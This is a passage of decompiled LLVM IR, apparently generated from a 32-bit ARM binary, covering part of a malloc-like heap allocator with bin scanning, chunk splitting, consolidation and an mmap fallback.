  br i1 %v9_13548, label %dec_label_pc_13550.loopexit, label %dec_label_pc_134b0

dec_label_pc_13550.loopexit:                      ; preds = %dec_label_pc_13548
  br label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %dec_label_pc_13498.dec_label_pc_13550_crit_edge, %dec_label_pc_13550.loopexit
  %v4_13580.pre-phi = phi i32 [ %.pre204, %dec_label_pc_13498.dec_label_pc_13550_crit_edge ], [ %v4_134a0, %dec_label_pc_13550.loopexit ]
  %v1_13550 = add i32 %v0_13550.pre, 1
  store i32 %v1_13550, i32* %r2.global-to-local, align 4
  %v1_13554 = urem i32 %v1_13550, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r0.global-to-local, align 4
  %v6_13560 = shl i32 1, %v1_13554
  store i32 %v6_13560, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13568 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13568, i32* %r3.global-to-local, align 4
  %v3_1356c = udiv i32 %v1_13550, 32
  store i32 %v3_1356c, i32* @r5, align 4
  %v4_13570 = mul nuw nsw i32 %v3_1356c, 4
  %v5_13570 = add i32 %v4_13568, %v4_13570
  store i32 %v5_13570, i32* %r2.global-to-local, align 4
  %v1_13574 = add i32 %v5_13570, 820
  %v2_13574 = inttoptr i32 %v1_13574 to i32*
  %v3_13574 = load i32, i32* %v2_13574, align 4
  store i32 %v3_13574, i32* @r4, align 4
  %v1_13578 = add i32 %v4_13568, 52
  store i32 %v1_13578, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_13580 = add i32 %v1_13578, %v4_13580.pre-phi
  store i32 %v5_13580, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13584

dec_label_pc_13584:                               ; preds = %dec_label_pc_135ec, %dec_label_pc_13550
  %v1_1358c = phi i32 [ %v1_1358c.pre, %dec_label_pc_135ec ], [ %v3_13574, %dec_label_pc_13550 ]
  %v0_1358c = phi i32 [ %v0_13584.pre, %dec_label_pc_135ec ], [ %v6_13560, %dec_label_pc_13550 ]
  %v1_13584 = sub i32 1, %v0_1358c
  %v2_13584 = icmp ult i32 %v0_1358c, 2
  %v1_13584. = select i1 %v2_13584, i32 %v1_13584, i32 0
  store i32 %v1_13584., i32* %r3.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_1358c, %v1_1358c
  br i1 %tmp145, label %.thread16, label %bb146

.thread16:                                        ; preds = %dec_label_pc_13584
  %v5_13590 = or i32 %v1_13584., 1
  store i32 %v5_13590, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1359c.preheader

bb146:                                            ; preds = %dec_label_pc_13584
  %v2_13594 = icmp eq i32 %v1_13584., 0
  br i1 %v2_13594, label %.dec_label_pc_135d8.preheader_crit_edge, label %dec_label_pc_1359c.preheader

.dec_label_pc_135d8.preheader_crit_edge:          ; preds = %bb146
  %v0_135d058.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135d8.preheader

dec_label_pc_1359c.preheader:                     ; preds = %bb146, %.thread16
  %v0_1359c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_1359c.preheader, %dec_label_pc_135a8
  %v0_1359c = phi i32 [ %v0_1359c.pre, %dec_label_pc_1359c.preheader ], [ %v1_1359c, %dec_label_pc_135a8 ]
  %v1_1359c = add i32 %v0_1359c, 1
  store i32 %v1_1359c, i32* @r5, align 4
  %tmp212 = icmp ugt i32 %v1_1359c, 2
  br i1 %tmp212, label %dec_label_pc_1367c.loopexit, label %dec_label_pc_135a8

dec_label_pc_135a8:                               ; preds = %dec_label_pc_1359c
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r3.global-to-local, align 4
  %v1_135ac = load i32, i32* @r8, align 4
  %v2_135ac = add i32 %v1_135ac, ptrtoint (i32* @global_var_23010.366 to i32)
  %v3_135ac = inttoptr i32 %v2_135ac to i32*
  %v4_135ac = load i32, i32* %v3_135ac, align 4
  store i32 %v4_135ac, i32* %r2.global-to-local, align 4
  %v4_135b0 = mul i32 %v1_1359c, 4
  %v5_135b0 = add i32 %v4_135ac, %v4_135b0
  store i32 %v5_135b0, i32* %r3.global-to-local, align 4
  %v1_135b4 = add i32 %v5_135b0, 820
  %v2_135b4 = inttoptr i32 %v1_135b4 to i32*
  %v3_135b4 = load i32, i32* %v2_135b4, align 4
  store i32 %v3_135b4, i32* @r4, align 4
  %v2_135b8 = icmp eq i32 %v3_135b4, 0
  br i1 %v2_135b8, label %dec_label_pc_1359c, label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135a8
  %v4_135c0 = mul i32 %v1_1359c, 256
  %v5_135c0 = add i32 %v4_135ac, %v4_135c0
  store i32 %v5_135c0, i32* %r3.global-to-local, align 4
  %v1_135c4 = add i32 %v5_135c0, 44
  store i32 %v1_135c4, i32* %r0.global-to-local, align 4
  %v0_135c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_135c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_135d8.preheader

dec_label_pc_135d8.preheader:                     ; preds = %.dec_label_pc_135d8.preheader_crit_edge, %dec_label_pc_135c0
  %v0_135d058 = phi i32 [ %v1_135c4, %dec_label_pc_135c0 ], [ %v0_135d058.pre, %.dec_label_pc_135d8.preheader_crit_edge ]
  %v0_135f4 = phi i32 [ %v3_135b4, %dec_label_pc_135c0 ], [ %v1_1358c, %.dec_label_pc_135d8.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_135c8, %dec_label_pc_135c0 ], [ %v0_1358c, %.dec_label_pc_135d8.preheader_crit_edge ]
  %v2_135d855 = and i32 %ip.promoted, %v0_135f4
  %v4_135d857 = icmp eq i32 %v2_135d855, 0
  br i1 %v4_135d857, label %dec_label_pc_135d0, label %dec_label_pc_135e0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135d8.preheader, %dec_label_pc_135d0
  %v2_135d460 = phi i32 [ %v2_135d4, %dec_label_pc_135d0 ], [ %ip.promoted, %dec_label_pc_135d8.preheader ]
  %v0_135d059 = phi i32 [ %v1_135d0, %dec_label_pc_135d0 ], [ %v0_135d058, %dec_label_pc_135d8.preheader ]
  %v1_135d0 = add i32 %v0_135d059, 8
  %v2_135d4 = mul i32 %v2_135d460, 2
  %v2_135d8 = and i32 %v2_135d4, %v0_135f4
  %v4_135d8 = icmp eq i32 %v2_135d8, 0
  br i1 %v4_135d8, label %dec_label_pc_135d0, label %dec_label_pc_135d8.dec_label_pc_135e0_crit_edge

dec_label_pc_135d8.dec_label_pc_135e0_crit_edge:  ; preds = %dec_label_pc_135d0
  store i32 %v1_135d0, i32* %r0.global-to-local, align 4
  store i32 %v2_135d4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135d8.dec_label_pc_135e0_crit_edge, %dec_label_pc_135d8.preheader
  %v0_13600 = phi i32 [ %v2_135d4, %dec_label_pc_135d8.dec_label_pc_135e0_crit_edge ], [ %ip.promoted, %dec_label_pc_135d8.preheader ]
  %v0_13624 = phi i32 [ %v1_135d0, %dec_label_pc_135d8.dec_label_pc_135e0_crit_edge ], [ %v0_135d058, %dec_label_pc_135d8.preheader ]
  %v1_135e0 = add i32 %v0_13624, 12
  %v2_135e0 = inttoptr i32 %v1_135e0 to i32*
  %v3_135e0 = load i32, i32* %v2_135e0, align 4
  store i32 %v3_135e0, i32* @lr, align 4
  %v9_135e4 = icmp eq i32 %v3_135e0, %v0_13624
  br i1 %v9_135e4, label %dec_label_pc_135ec, label %dec_label_pc_1360c

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135e0
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r0.global-to-local, align 4
  %v1_135f0 = load i32, i32* @r8, align 4
  %v2_135f0 = add i32 %v1_135f0, ptrtoint (i32* @global_var_23010.366 to i32)
  %v3_135f0 = inttoptr i32 %v2_135f0 to i32*
  %v4_135f0 = load i32, i32* %v3_135f0, align 4
  %v2_135f4 = sub i32 -1, %v0_13600
  %v3_135f4 = and i32 %v0_135f4, %v2_135f4
  store i32 %v3_135f4, i32* @r4, align 4
  %v1_135f8 = load i32, i32* @r5, align 4
  %v4_135f8 = mul i32 %v1_135f8, 4
  %v5_135f8 = add i32 %v4_135f8, %v4_135f0
  store i32 %v5_135f8, i32* %r3.global-to-local, align 4
  %v1_135fc = add i32 %v0_13624, 8
  store i32 %v1_135fc, i32* %r0.global-to-local, align 4
  %v2_13600 = mul i32 %v0_13600, 2
  store i32 %v2_13600, i32* %ip.global-to-local, align 4
  %v2_13604 = add i32 %v5_135f8, 820
  %v3_13604 = inttoptr i32 %v2_13604 to i32*
  store i32 %v3_135f4, i32* %v3_13604, align 4
  %v0_13584.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_1358c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13584

dec_label_pc_1360c:                               ; preds = %dec_label_pc_135e0
  %v1_1360c = add i32 %v3_135e0, 4
  %v2_1360c = inttoptr i32 %v1_1360c to i32*
  %v3_1360c = load i32, i32* %v2_1360c, align 4
  store i32 %v3_1360c, i32* %r3.global-to-local, align 4
  %v1_13610 = and i32 %v3_1360c, -4
  store i32 %v1_13610, i32* %r2.global-to-local, align 4
  %v0_13614 = load i32, i32* @sl, align 4
  %v2_13614 = sub i32 %v1_13610, %v0_13614
  store i32 %v2_13614, i32* %ip.global-to-local, align 4
  %v1_13618 = add i32 %v3_135e0, 12
  %v2_13618 = inttoptr i32 %v1_13618 to i32*
  %v3_13618 = load i32, i32* %v2_13618, align 4
  store i32 %v3_13618, i32* %r3.global-to-local, align 4
  %tmp213 = icmp ult i32 %v2_13614, 16
  br i1 %tmp213, label %bb147, label %bb148

bb147:                                            ; preds = %dec_label_pc_1360c
  %v6_13620 = add i32 %v1_13610, %v3_135e0
  store i32 %v6_13620, i32* %r2.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1360c, %bb147
  %v2_13624 = add i32 %v3_13618, 8
  %v3_13624 = inttoptr i32 %v2_13624 to i32*
  store i32 %v0_13624, i32* %v3_13624, align 4
  %v0_13628 = load i32, i32* %r3.global-to-local, align 4
  %v1_13628 = load i32, i32* %r0.global-to-local, align 4
  %v2_13628 = add i32 %v1_13628, 12
  %v3_13628 = inttoptr i32 %v2_13628 to i32*
  store i32 %v0_13628, i32* %v3_13628, align 4
  %v4_1362c = load i32, i32* @lr, align 4
  br i1 %tmp213, label %.dec_label_pc_13508_crit_edge, label %dec_label_pc_13638

.dec_label_pc_13508_crit_edge:                    ; preds = %bb148
  %v5_1362c = add i32 %v4_1362c, 8
  store i32 %v5_1362c, i32* %r4.global-to-local, align 4
  %v4_13630 = load i32, i32* %r2.global-to-local, align 4
  %v5_13630 = add i32 %v4_13630, 4
  %v6_13630 = inttoptr i32 %v5_13630 to i32*
  %v7_13630 = load i32, i32* %v6_13630, align 4
  store i32 %v7_13630, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13638:                               ; preds = %bb148
  %v1_13638 = load i32, i32* @sl, align 4
  %v2_13638 = add i32 %v1_13638, %v4_1362c
  store i32 %v2_13638, i32* %r1.global-to-local, align 4
  %v1_13640 = load i32, i32* @r6, align 4
  %v2_13640 = add i32 %v1_13640, 8
  %v3_13640 = inttoptr i32 %v2_13640 to i32*
  store i32 %v2_13638, i32* %v3_13640, align 4
  %v0_13644 = load i32, i32* %r1.global-to-local, align 4
  %v1_13644 = load i32, i32* @r6, align 4
  %v2_13644 = add i32 %v1_13644, 12
  %v3_13644 = inttoptr i32 %v2_13644 to i32*
  store i32 %v0_13644, i32* %v3_13644, align 4
  %v0_13648 = load i32, i32* @r6, align 4
  %v1_13648 = load i32, i32* %r1.global-to-local, align 4
  %v2_13648 = add i32 %v1_13648, 8
  %v3_13648 = inttoptr i32 %v2_13648 to i32*
  store i32 %v0_13648, i32* %v3_13648, align 4
  %v0_1364c = load i32, i32* @r6, align 4
  %v1_1364c = load i32, i32* %r1.global-to-local, align 4
  %v2_1364c = add i32 %v1_1364c, 12
  %v3_1364c = inttoptr i32 %v2_1364c to i32*
  store i32 %v0_1364c, i32* %v3_1364c, align 4
  %tmp214 = icmp ult i32 %v1_13638, 256
  br i1 %tmp214, label %bb149, label %.thread125

bb149:                                            ; preds = %dec_label_pc_13638
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v8_13658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v8_13658, i32* %r3.global-to-local, align 4
  %v4_1365c = load i32, i32* %r1.global-to-local, align 4
  %v6_1365c = add i32 %v8_13658, 48
  %v7_1365c = inttoptr i32 %v6_1365c to i32*
  store i32 %v4_1365c, i32* %v7_1365c, align 4
  br label %.thread125

.thread125:                                       ; preds = %dec_label_pc_13638, %bb149
  %v0_13660 = load i32, i32* @sl, align 4
  %v1_13660 = or i32 %v0_13660, 1
  store i32 %v1_13660, i32* %r2.global-to-local, align 4
  %v0_13664 = load i32, i32* %ip.global-to-local, align 4
  %v1_13664 = or i32 %v0_13664, 1
  store i32 %v1_13664, i32* %r3.global-to-local, align 4
  %v0_13668 = load i32, i32* @lr, align 4
  %v1_13668 = add i32 %v0_13668, 8
  store i32 %v1_13668, i32* %r4.global-to-local, align 4
  %v2_1366c = add i32 %v0_13668, 4
  %v3_1366c = inttoptr i32 %v2_1366c to i32*
  store i32 %v1_13660, i32* %v3_1366c, align 4
  %v0_13670 = load i32, i32* %ip.global-to-local, align 4
  %v1_13670 = load i32, i32* %r1.global-to-local, align 4
  %v3_13670 = add i32 %v1_13670, %v0_13670
  %v4_13670 = inttoptr i32 %v3_13670 to i32*
  store i32 %v0_13670, i32* %v4_13670, align 4
  %v0_13674 = load i32, i32* %r3.global-to-local, align 4
  %v1_13674 = load i32, i32* %r1.global-to-local, align 4
  %v2_13674 = add i32 %v1_13674, 4
  %v3_13674 = inttoptr i32 %v2_13674 to i32*
  store i32 %v0_13674, i32* %v3_13674, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_1367c.loopexit:                      ; preds = %dec_label_pc_1359c
  br label %dec_label_pc_1367c

dec_label_pc_1367c:                               ; preds = %dec_label_pc_1367c.loopexit, %dec_label_pc_13290, %dec_label_pc_13298
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  %v4_13684 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13684, i32* @r0, align 4
  %v1_13688 = add i32 %v4_13684, 44
  %v2_13688 = inttoptr i32 %v1_13688 to i32*
  %v3_13688 = load i32, i32* %v2_13688, align 4
  store i32 %v3_13688, i32* %ip.global-to-local, align 4
  %v1_1368c = add i32 %v3_13688, 4
  %v2_1368c = inttoptr i32 %v1_1368c to i32*
  %v3_1368c = load i32, i32* %v2_1368c, align 4
  %v0_13690 = load i32, i32* @sl, align 4
  %v1_13690 = add i32 %v0_13690, 16
  store i32 %v1_13690, i32* %r1.global-to-local, align 4
  %v1_13694 = and i32 %v3_1368c, -4
  store i32 %v1_13694, i32* %r3.global-to-local, align 4
  %v3_13698 = icmp ult i32 %v1_13694, %v1_13690
  br i1 %v3_13698, label %dec_label_pc_136c8, label %dec_label_pc_136a4

dec_label_pc_136a4:                               ; preds = %dec_label_pc_1367c
  %v2_136a4 = sub i32 %v1_13694, %v0_13690
  %v2_136a8 = add i32 %v0_13690, %v3_13688
  store i32 %v2_136a8, i32* %r1.global-to-local, align 4
  %v1_136ac = or i32 %v2_136a4, 1
  store i32 %v1_136ac, i32* %r3.global-to-local, align 4
  %v1_136b0 = or i32 %v0_13690, 1
  store i32 %v1_136b0, i32* %r2.global-to-local, align 4
  %v1_136b4 = add i32 %v3_13688, 8
  store i32 %v1_136b4, i32* %r4.global-to-local, align 4
  store i32 %v1_136b0, i32* %v2_1368c, align 4
  %v0_136bc = load i32, i32* %r1.global-to-local, align 4
  %v1_136bc = load i32, i32* @r0, align 4
  %v2_136bc = add i32 %v1_136bc, 44
  %v3_136bc = inttoptr i32 %v2_136bc to i32*
  store i32 %v0_136bc, i32* %v3_136bc, align 4
  %v0_136c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_136c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c0 = add i32 %v1_136c0, 4
  %v3_136c0 = inttoptr i32 %v2_136c0 to i32*
  store i32 %v0_136c0, i32* %v3_136c0, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_136c8:                               ; preds = %dec_label_pc_1367c
  %v1_136c8 = inttoptr i32 %v4_13684 to i32*
  %v2_136c8 = load i32, i32* %v1_136c8, align 4
  store i32 %v2_136c8, i32* %r3.global-to-local, align 4
  %v1_136cc = and i32 %v2_136c8, 2
  store i32 %v1_136cc, i32* %ip.global-to-local, align 4
  %v2_136cc = icmp eq i32 %v1_136cc, 0
  %v1_136d0 = add i32 %v4_13684, 860
  %v2_136d0 = inttoptr i32 %v1_136d0 to i32*
  %v3_136d0 = load i32, i32* %v2_136d0, align 4
  store i32 %v3_136d0, i32* %r1.global-to-local, align 4
  br i1 %v2_136cc, label %dec_label_pc_136e8, label %dec_label_pc_136d8

dec_label_pc_136d8:                               ; preds = %dec_label_pc_136c8
  %v0_136d8 = call i32 @__malloc_consolidate()
  %v0_136dc = load i32, i32* @sl, align 4
  %v1_136dc = add i32 %v0_136dc, -7
  store i32 %v1_136dc, i32* @r0, align 4
  %v0_136e0 = call i32 @malloc()
  store i32 %v0_136e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136c8
  %v1_136e8 = add i32 %v4_13684, 844
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* %r3.global-to-local, align 4
  %v3_136ec = icmp ult i32 %v0_13690, %v3_136e8
  %v1_136f0 = add i32 %v3_136d0, -1
  store i32 %v1_136f0, i32* %sb.global-to-local, align 4
  br i1 %v3_136ec, label %dec_label_pc_137c4, label %dec_label_pc_136f8

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136e8
  %v1_136f8 = add i32 %v4_13684, 852
  %v2_136f8 = inttoptr i32 %v1_136f8 to i32*
  %v3_136f8 = load i32, i32* %v2_136f8, align 4
  store i32 %v3_136f8, i32* %r2.global-to-local, align 4
  %v1_136fc = add i32 %v4_13684, 848
  %v2_136fc = inttoptr i32 %v1_136fc to i32*
  %v3_136fc = load i32, i32* %v2_136fc, align 4
  store i32 %v3_136fc, i32* %r3.global-to-local, align 4
  %v6_13704 = icmp slt i32 %v3_136fc, %v3_136f8
  br i1 %v6_13704, label %dec_label_pc_13708, label %dec_label_pc_137c4

dec_label_pc_13708:                               ; preds = %dec_label_pc_136f8
  %v1_13708 = add i32 %v0_13690, 10
  %v2_1370c = add i32 %v1_13708, %v3_136d0
  store i32 %v2_1370c, i32* %r3.global-to-local, align 4
  %v2_13710 = sub i32 0, %v3_136d0
  %v3_13710 = and i32 %v2_1370c, %v2_13710
  store i32 %v3_13710, i32* @r4, align 4
  %tmp215 = icmp ugt i32 %v3_13710, %v0_13690
  br i1 %tmp215, label %dec_label_pc_1371c, label %dec_label_pc_137c4

dec_label_pc_1371c:                               ; preds = %dec_label_pc_13708
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_13710, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_13734 = call i32 @mmap(i32 0, i32 %v3_13710, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_13734, i32* %r0.global-to-local, align 4
  %v7_13738 = icmp eq i32 %v6_13734, -1
  br i1 %v7_13738, label %dec_label_pc_1371c.dec_label_pc_137c4_crit_edge, label %dec_label_pc_13740

dec_label_pc_1371c.dec_label_pc_137c4_crit_edge:  ; preds = %dec_label_pc_1371c
  %v1_137e8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_137c4

dec_label_pc_13740:                               ; preds = %dec_label_pc_1371c
  %v1_13740 = urem i32 %v6_13734, 8
  store i32 %v1_13740, i32* %r2.global-to-local, align 4
  %v2_13740 = icmp eq i32 %v1_13740, 0
  br i1 %v2_13740, label %bb150, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_13740
  %v2_13744 = sub nsw i32 8, %v1_13740
  store i32 %v2_13744, i32* %r3.global-to-local, align 4
  %v2_13748 = load i32, i32* @r4, align 4
  %v3_13748 = sub i32 %v2_13748, %v2_13744
  %v3_1374c = add i32 %v2_13744, %v6_13734
  store i32 %v3_1374c, i32* %lr.global-to-local, align 4
  %v2_13754 = or i32 %v3_13748, 2
  store i32 %v2_13754, i32* %r2.global-to-local, align 4
  %v5_1375c = inttoptr i32 %v3_1374c to i32*
  store i32 %v2_13744, i32* %v5_1375c, align 4
  %v1_13760 = load i32, i32* %r2.global-to-local, align 4
  %v2_13760 = load i32, i32* %lr.global-to-local, align 4
  %v3_13760 = add i32 %v2_13760, 4
  %v4_13760 = inttoptr i32 %v3_13760 to i32*
  store i32 %v1_13760, i32* %v4_13760, align 4
  br label %.thread31

bb150:                                            ; preds = %dec_label_pc_13740
  store i32 %v6_13734, i32* %lr.global-to-local, align 4
  %v1_1375851 = load i32, i32* @r4, align 4
  %v2_1375852 = or i32 %v1_1375851, 2
  store i32 %v2_1375852, i32* %r3.global-to-local, align 4
  %v3_13764 = inttoptr i32 %v6_13734 to i32*
  store i32 0, i32* %v3_13764, align 4
  %v1_13768 = load i32, i32* %r3.global-to-local, align 4
  %v2_13768 = load i32, i32* %lr.global-to-local, align 4
  %v3_13768 = add i32 %v2_13768, 4
  %v4_13768 = inttoptr i32 %v3_13768 to i32*
  store i32 %v1_13768, i32* %v4_13768, align 4
  br label %.thread31

.thread31:                                        ; preds = %.thread29, %bb150
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13774, i32* %ip.global-to-local, align 4
  %v1_13778 = add i32 %v4_13774, 848
  %v2_13778 = inttoptr i32 %v1_13778 to i32*
  %v3_13778 = load i32, i32* %v2_13778, align 4
  store i32 %v3_13778, i32* %r3.global-to-local, align 4
  %v1_1377c = add i32 %v4_13774, 856
  %v2_1377c = inttoptr i32 %v1_1377c to i32*
  %v3_1377c = load i32, i32* %v2_1377c, align 4
  store i32 %v3_1377c, i32* %r2.global-to-local, align 4
  %v1_13780 = add i32 %v3_13778, 1
  store i32 %v1_13780, i32* %r3.global-to-local, align 4
  %v7_13788 = icmp sgt i32 %v1_13780, %v3_1377c
  br i1 %v7_13788, label %bb151, label %bb152

bb151:                                            ; preds = %.thread31
  store i32 %v1_13780, i32* %v2_1377c, align 4
  %v0_1378c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1378c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %.thread31, %bb151
  %v1_1378c = phi i32 [ %v4_13774, %.thread31 ], [ %v1_1378c.pre, %bb151 ]
  %v0_1378c = phi i32 [ %v1_13780, %.thread31 ], [ %v0_1378c.pre, %bb151 ]
  %v2_1378c = add i32 %v1_1378c, 848
  %v3_1378c = inttoptr i32 %v2_1378c to i32*
  store i32 %v0_1378c, i32* %v3_1378c, align 4
  %v0_13790 = load i32, i32* %ip.global-to-local, align 4
  %v1_13790 = add i32 %v0_13790, 868
  %v2_13790 = inttoptr i32 %v1_13790 to i32*
  %v3_13790 = load i32, i32* %v2_13790, align 4
  store i32 %v3_13790, i32* %r3.global-to-local, align 4
  %v1_13794 = add i32 %v0_13790, 880
  %v2_13794 = inttoptr i32 %v1_13794 to i32*
  %v3_13794 = load i32, i32* %v2_13794, align 4
  store i32 %v3_13794, i32* %r2.global-to-local, align 4
  %v0_13798 = load i32, i32* @r4, align 4
  %v2_13798 = add i32 %v0_13798, %v3_13790
  store i32 %v2_13798, i32* %r1.global-to-local, align 4
  %v1_1379c = add i32 %v0_13790, 872
  %v2_1379c = inttoptr i32 %v1_1379c to i32*
  %v3_1379c = load i32, i32* %v2_1379c, align 4
  store i32 %v3_1379c, i32* %r3.global-to-local, align 4
  %v1_137a4 = add i32 %v0_13790, 884
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  store i32 %v3_137a4, i32* %r2.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_13798, %v3_13794
  br i1 %tmp216, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 %v2_13798, i32* %v2_13794, align 4
  %v0_137ac.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_137ac.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %v1_137ac = phi i32 [ %v0_13790, %bb152 ], [ %v1_137ac.pre, %bb153 ]
  %v0_137ac = phi i32 [ %v2_13798, %bb152 ], [ %v0_137ac.pre, %bb153 ]
  %v2_137ac = add i32 %v1_137ac, 868
  %v3_137ac = inttoptr i32 %v2_137ac to i32*
  store i32 %v0_137ac, i32* %v3_137ac, align 4
  %v0_137b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_137b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_137b0 = add i32 %v1_137b0, %v0_137b0
  store i32 %v2_137b0, i32* %r1.global-to-local, align 4
  %v1_137b4 = load i32, i32* %r2.global-to-local, align 4
  %v0_137b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_137b8 = add i32 %v0_137b8, 8
  store i32 %v1_137b8, i32* %r0.global-to-local, align 4
  %tmp217 = icmp ugt i32 %v2_137b0, %v1_137b4
  br i1 %tmp217, label %bb155, label %dec_label_pc_13acc

bb155:                                            ; preds = %bb154
  %v5_137bc = load i32, i32* %ip.global-to-local, align 4
  %v6_137bc = add i32 %v5_137bc, 884
  %v7_137bc = inttoptr i32 %v6_137bc to i32*
  store i32 %v2_137b0, i32* %v7_137bc, align 4
  br label %dec_label_pc_13acc

dec_label_pc_137c4:                               ; preds = %dec_label_pc_13708, %dec_label_pc_136e8, %dec_label_pc_1371c.dec_label_pc_137c4_crit_edge, %dec_label_pc_136f8
  %v1_137e8 = phi i32 [ %v1_137e8.pre, %dec_label_pc_1371c.dec_label_pc_137c4_crit_edge ], [ %v0_13690, %dec_label_pc_136f8 ], [ %v0_13690, %dec_label_pc_136e8 ], [ %v0_13690, %dec_label_pc_13708 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  %v4_137cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_137cc, i32* %r3.global-to-local, align 4
  %v1_137d0 = add i32 %v4_137cc, 44
  %v2_137d0 = inttoptr i32 %v1_137d0 to i32*
  %v3_137d0 = load i32, i32* %v2_137d0, align 4
  store i32 %v3_137d0, i32* %r0.global-to-local, align 4
  %v1_137d4 = add i32 %v4_137cc, 864
  %v2_137d4 = inttoptr i32 %v1_137d4 to i32*
  %v3_137d4 = load i32, i32* %v2_137d4, align 4
  store i32 %v3_137d4, i32* %r2.global-to-local, align 4
  %v1_137d8 = add i32 %v4_137cc, 840
  %v2_137d8 = inttoptr i32 %v1_137d8 to i32*
  %v3_137d8 = load i32, i32* %v2_137d8, align 4
  store i32 %v3_137d8, i32* %r3.global-to-local, align 4
  %v1_137dc = add i32 %v3_137d0, 4
  %v2_137dc = inttoptr i32 %v1_137dc to i32*
  %v3_137dc = load i32, i32* %v2_137dc, align 4
  store i32 %v3_137dc, i32* %r1.global-to-local, align 4
  %v1_137e4 = urem i32 %v3_137d4, 2
  %v2_137e4 = icmp eq i32 %v1_137e4, 0
  %v1_137e0 = add i32 %v1_137e8, 16
  %v2_137e8 = add i32 %v1_137e0, %v3_137d8
  store i32 %v2_137e8, i32* %r3.global-to-local, align 4
  %v1_137ec = and i32 %v3_137dc, -4
  store i32 %v1_137ec, i32* @r8, align 4
  br i1 %v2_137e4, label %bb157, label %bb156

bb156:                                            ; preds = %dec_label_pc_137c4
  %v3_137f0 = sub i32 %v2_137e8, %v1_137ec
  store i32 %v3_137f0, i32* %r3.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_137c4, %bb156
  %v0_137f4 = phi i32 [ %v2_137e8, %dec_label_pc_137c4 ], [ %v3_137f0, %bb156 ]
  %v1_137f4 = load i32, i32* %sb.global-to-local, align 4
  %v2_137f4 = add i32 %v1_137f4, %v0_137f4
  store i32 %v2_137f4, i32* %r3.global-to-local, align 4
  %v1_137f8 = sub i32 -1, %v1_137f4
  store i32 %v1_137f8, i32* %fp.global-to-local, align 4
  %v2_137fc = and i32 %v2_137f4, %v1_137f8
  store i32 %v2_137fc, i32* @r5, align 4
  %tmp158 = icmp slt i32 %v2_137fc, 1
  br i1 %tmp158, label %dec_label_pc_13820, label %dec_label_pc_1380c

